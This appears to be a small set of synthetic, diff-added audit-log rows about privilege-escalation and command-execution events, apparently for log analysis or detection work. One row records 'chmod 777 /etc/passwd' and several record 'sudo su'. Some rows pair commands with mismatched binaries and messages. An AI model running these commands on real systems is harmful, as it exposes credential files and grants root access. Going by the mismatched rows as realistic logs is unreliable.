+2025-05-03T01:13:17Z,U9369,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.93,62956,Routine system scan
+2025-05-03T04:02:17Z,U6904,exec,/bin/bash,run,sudo su,success,10.0.0.83,22390,Privileged command executed
+2025-05-01T19:10:17Z,U6673,exec,/usr/bin/wget,run,chmod 777 /etc/passwd,failure,10.0.0.88,22291,Invalid argument
+2025-05-06T14:49:17Z,U6880,exec,/usr/bin/top,run,ls -al /etc,success,10.0.0.172,17130,Normal command execution
+2025-05-07T05:10:17Z,U1240,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.37,76232,Routine system scan
+2025-05-01T07:07:17Z,U7115,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.173,50257,Invalid argument
+2025-05-02T06:53:17Z,U3953,exec,/bin/bash,run,touch /tmp/testfile,success,10.0.0.42,92954,Routine system scan
+2025-05-05T19:15:17Z,U7762,privilege_escalation,/bin/sudo,run,sudo su,failure,10.0.0.222,72485,Segmentation fault
+2025-04-30T09:54:17Z,U4072,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.136,62218,Privileged command executed
+2025-05-02T13:10:17Z,U9710,privilege_escalation,/bin/sudo,run,sudo su,success,10.0.0.86,33101,Access to sensitive file
